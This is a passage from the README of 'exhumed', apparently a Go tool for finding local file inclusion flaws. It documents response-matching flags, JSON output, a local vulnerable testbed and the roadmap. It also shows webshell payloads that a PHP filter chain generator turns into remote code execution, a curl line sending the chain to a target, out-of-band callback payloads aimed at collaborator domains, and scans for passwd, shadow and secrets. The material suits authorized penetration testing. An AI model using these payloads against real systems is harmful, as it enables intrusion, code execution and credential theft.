             --match-body-json 'ok: true'

# Keep only responses whose nested data.path field looks like a real unix path
exhumed scan --url "http://target.local/api?file=FUZZ" \
             --match-body-json 'data.path: ^/(etc|home|var)/'

# Index into a JSON array: keep only responses whose first result is named passwd
exhumed scan --url "http://target.local/api?file=FUZZ" \
             --match-body-json 'results.0.name: passwd'
```

A body that is **not valid JSON**, a path that does **not exist**, or a path that
lands on an **object or array** (not a scalar) never satisfies a rule — an active
matcher drops it. If an object key itself contains a literal dot, escape it with a
backslash (`a\.b` is the single key `a.b`, not the two-segment path `a` → `b`).

When more than one rule is supplied they **compose as a conjunction** — every
rule must match. This extends the family's conjunction semantics to the JSON
surface: with `--match-body-json` and the other match gates active, an unconfirmed
response is kept only if every JSON rule resolves and matches **and** every other
match gate passes:

```bash
# Both must match: a true success flag AND an /etc/ path in the data envelope
exhumed scan --url "http://target.local/api?file=FUZZ" \
             --match-body-json 'ok: true' \
             --match-body-json 'data.path: ^/etc/'
```

There is no `ffuf` flag for structured JSON matching — its matchers treat the
body as opaque text — so `--match-body-json` is the JSON-surface complement that
rounds out the family for the JSON-API LFI use case. The match gates run
**before** the `--filter-*` suppressors, which then prune residual noise from the
kept set. Like the other gates, `--match-body-json` only governs the *unconfirmed*
stream — **confirmed hits are always reported regardless of their JSON shape**. An
empty spec keeps everything (no-op); a rule missing its colon, with an empty path
or path segment, or with an unparsable regex is a hard error before any request
fires.

### Keeping only interesting HTML titles (`--match-title`)

`--match-title` is the **HTML `<title>`** sibling of `--match-regex`. Where
`--match-regex` runs an unanchored "contains" match against the *raw body bytes*
— and so fires whenever the searched term appears anywhere in a soft-404's
chrome (navigation bar, footer, generic error template, an echoed query
string) — `--match-title` extracts the first `<title>...</title>` element from
the body and matches the operator's regex against the **decoded title text
only**. This matters because many LFI targets are HTML-rendered web apps whose
chrome wraps either a real file (whose title shifts: `"Index of /etc"`,
`"passwd"`) or a uniform error page (whose title is constant: `"404 Not
Found"`, `"403 Forbidden"`, `"Access Denied"`). Pinning the keep-gate to the
title removes the cross-fragment false positives a whole-body `--match-regex`
produces.

The flag is **repeatable**; each value is one Go (RE2) regex applied as an
unanchored "contains" match against the extracted title. The extractor finds
the first `<title>...</title>` pair (case-insensitive on the tag name,
tolerant of attributes), decodes the four common named entities (`&amp;`,
`&lt;`, `&gt;`, `&quot;`) and any decimal or hex numeric character reference,
and collapses runs of whitespace to a single space (mirroring how a browser
renders the title bar):

```bash
# Keep only responses whose HTML title looks like a directory listing
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-title '(?i)index of'

# Keep only titles naming a sensitive file
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-title '(?i)passwd|shadow|hosts'

# Keep only titles starting with a real-looking path
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-title '^/etc/'
```

A body that is **not HTML**, a body with no closed `<title>` element, or a
body truncated before the closing tag yields no title — an active matcher
drops it.

When more than one regex is supplied they **compose as a conjunction** —
every regex must match the same extracted title. This extends the family's
conjunction semantics to the title surface: with `--match-title` and the
other match gates active, an unconfirmed response is kept only if every title
rule matches **and** every other match gate passes:

```bash
# Both must match the SAME title
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-title '(?i)index of' \
             --match-title '/etc'
```

There is no `ffuf` flag for HTML-title matching — its matchers are
body/status/size/word/line oriented and have no HTML-structural matcher — so
`--match-title` is the title-surface complement that rounds out the family
for the HTML-rendered LFI use case. The match gates run **before** the
`--filter-*` suppressors, which then prune residual noise from the kept set.
Like the other gates, `--match-title` only governs the *unconfirmed* stream —
**confirmed hits are always reported regardless of their title** (or lack of
one). An empty spec keeps everything (no-op); an unparsable regex is a hard
error before any request fires.

### Local testbed (deliberately vulnerable dev server)

```bash
# Start the testbed (localhost only, sandboxed fake filesystem)
go run ./testbed/server

# Then scan against it
exhumed scan --url "http://127.0.0.1:8080/?file=FUZZ" --verbose
```

### JSON output

Pass `--output json` to emit a single machine-readable JSON document instead of
the default human-readable text. The document is written to stdout after the scan
completes and is suitable for piping to `jq`, logging to SIEM, or feeding
downstream automation:

```bash
# Structured JSON output
exhumed scan --url "http://target.local/?file=FUZZ" --output json

# Pipe to jq for pretty inspection
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq '.hits[].findings'

# Extract confirmed file paths
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq -r '.hits[].path'

# Only emit secrets (filter in jq)
exhumed scan --url "http://target.local/?file=FUZZ" --output json --show-secrets \
  | jq '.hits[].findings[] | select(.type == "secret")'
```

The JSON schema is versioned (`schema_version: "1"`). Top-level fields:

| Field | Type | Description |
|---|---|---|
| `schema_version` | string | Format version for downstream parsers |
| `started_at` / `completed_at` | RFC3339 | Scan wall-clock times |
| `target` | string | The scanned URL |
| `total_requests` | int | HTTP requests fired |
| `confirmed_hits` | int | Files successfully read |
| `chain_targets_queued` | int | Follow-on paths generated |
| `hits` | array | Each confirmed hit with findings |

Each hit includes `entry_id`, `path`, `technique`, `status_code`, `elapsed_ms`,
`snippets`, `findings`, `chain` (bool), and `chain_depth`.

### PHP filter chains (RCE escalation)

A confirmed file-read is often only a step away from remote code execution.
When the target `include()`/`require()`s a parameter you control, the
**PHP filter chain** technique (loknop's research, popularised by synacktiv)
turns that read primitive into *arbitrary content*: chained `convert.iconv`
filters reconstruct a payload of your choosing — typically a PHP webshell — from
a resource whose original contents don't matter, and the `include()` sink then
executes it.

`exhumed payload php-filter` is a payload **generator**: it prints the
`php://filter/...` string and performs no network I/O. You place the string into
the vulnerable parameter yourself.

```bash
# Generate a chain that runs system($_GET[0]) on the target
exhumed payload php-filter --rce '<?php system($_GET[0]);?>'

# Short-tag webshell, custom sink resource (default is php://temp)
exhumed payload php-filter --rce '<?=`$_GET[0]`?>' --resource php://temp

# Then feed the printed chain to the vulnerable parameter, e.g.:
#   curl 'http://target.local/?file=php://filter/...&0=id'
```

The generated chain is **byte-for-byte identical** to synacktiv's reference
`php_filter_chain_generator` for the same payload (pinned by a golden test), and
the construction is pure-Go string assembly — no GPL dependencies, no PHP runtime
required to generate.

Debug / verification mode: pass a pre-encoded base64 payload with `--raw-base64`
and `--debug` to emit a chain that surfaces the *reconstructed base64* (omitting
the final decode) so you can confirm the chain rebuilds your bytes correctly on
the target before arming it:

```bash
exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug
```

### Out-of-band confirmation for blind LFI

`exhumed`'s detection is response-body pattern matching, so it cannot see a
**blind** sink — one that reads or `include()`s a file but never reflects its
contents in the HTTP response. `exhumed payload oob` generates out-of-band
payloads that force the target to make an outbound interaction (DNS, SMB, or
HTTP) to a collaborator domain you control. Observing that interaction at your
collaborator (interactsh, Burp Collaborator, a controlled DNS/HTTP log) proves
the sink fired even with an empty response.

Like the other `payload` subcommands, generation is pure: `exhumed payload oob`
prints the strings and performs no network I/O. You place each string into the
vulnerable parameter and correlate hits at your collaborator — either an
external one (interactsh, Burp Collaborator) or the **built-in listener**
described below.

```bash
exhumed payload oob --domain abc123.oast.fun
```

```
smb-unc        \\abc123.oast.fun\exhumed
http-wrapper   http://abc123.oast.fun/exhumed-oob
https-wrapper  https://abc123.oast.fun/exhumed-oob
dns-resolve    \\abc123.oast.fun\
```

Four techniques are emitted, most to least reliable:

| Technique | Payload shape | Fires when |
|-----------|---------------|-----------|
| `smb-unc` | `\\<domain>\<share>` | Windows `include()` / Java / .NET file APIs dereference UNC paths (SMB + DNS) |
| `http-wrapper` | `http://<domain>/...` | `allow_url_include` is on or the sink fetches URLs |
| `https-wrapper` | `https://<domain>/...` | egress only permits TLS fetches |
| `dns-resolve` | `\\<domain>\` | DNS lookup only — survives strict egress that blocks SMB/HTTP |

Pass `--label` to prepend a per-technique subdomain (`http.<domain>`,
`dns.<domain>`, …) so an observed interaction can be attributed to the technique
that triggered it, and `--json` for machine-readable output (value, technique,
subdomain, and a note describing each payload's precondition). `--share` and
`--path` customise the SMB share and the http(s) resource path.

```bash
exhumed payload oob --domain x.burpcollaborator.net --label --json
```

#### Built-in collaborator listener

`exhumed payload oob listen` runs a self-contained HTTP collaborator that records
the callbacks produced by the `http://` and `https://` OOB payloads — closing the
loop without an external service. When a blind sink dereferences a payload that
points at the listener, the request is captured and printed live, proving the
sink fired even with an empty target response. It makes no outbound calls and
needs no cgo, so it preserves the static-binary build.

```bash
exhumed payload oob listen --addr :8080
```

```
[*] OOB collaborator listening on http://0.0.0.0:8080/ (Ctrl-C to stop)
[hit #1] 21:10:36  203.0.113.7      http-wrapper  GET /exhumed-oob
[hit #2] 21:10:36  203.0.113.7      dns-resolve   GET /beacon
```

Each line shows the sequence number, time, the target's egress IP, the technique
(attributed via the request's leading `Host` subdomain when payloads were
generated with `--label`), the HTTP method, and the requested path. Press Ctrl-C
to stop; with `--json` a JSON array of every recorded interaction is written to
stdout on shutdown. Use `--addr :0` to bind an OS-assigned free port (printed on
startup).

The listener is intended for local and lab use where you control DNS for the
collaborator domain — or where you point payloads straight at its address. For
internet-facing blind testing, an external collaborator with a public resolver
remains the right tool; the built-in listener handles the SMB/DNS-only techniques
that an HTTP listener cannot observe.

```bash
# Generate http(s) payloads aimed at a domain that resolves to your listener,
# then run the listener to confirm callbacks:
exhumed payload oob --domain c.example.com --label
exhumed payload oob listen --addr :8080 --json
```

### Other commands

```bash
exhumed version          # print version, commit, date
exhumed version --db     # also print the active database version and source
exhumed update           # update file database (Packet 05 — stub for now)
exhumed --help
exhumed scan --help
```

`exhumed version --db` resolves the same database that `scan` and `db` would
load — the freshest of the bundled database and the feed cache — and prints its
version and source, so you can answer "am I current?" without running a scan:

```
exhumed dev (commit: none, built: unknown)
database 2026-05-20 (cache, /home/user/.cache/exhumed)
```

Database versions are compared with proper [semantic versioning](https://semver.org/)
(`golang.org/x/mod/semver`) when both versions are semver-shaped, so `1.10.0`
correctly outranks `1.9.0`. Date-based versions (`YYYY-MM-DD`) fall back to
lexicographic comparison, which is correct for fixed-width dates.

---

## Roadmap to v1.0

1. **Repo scaffold, HTTP engine, injection layer, traversal generator, testbed** ✅
2. **Versioned file database** — 150 curated high-value paths loaded from local files, spanning OS, web-server, framework, cloud, CI/CD, version-control, credential-store, and language-runtime targets ✅
3. **Remote feed** — `exhumed update` pulls the latest database from a versioned feed ✅
4. **Detection engine** — confirms successful inclusion via regex/keyword matching ✅
5. **Content extraction** — format-aware parsers (passwd, PHP config, env files, etc.) ✅
6. **Recursive follow-on chaining** — use extracted content to generate next targets ✅
7. **JSON-first output** — machine-readable results plus a human TTY mode ✅
8. **Single static binary release** — cross-compiled for Linux/macOS/Windows via GoReleaser

---

## License

MIT — see [LICENSE](LICENSE).
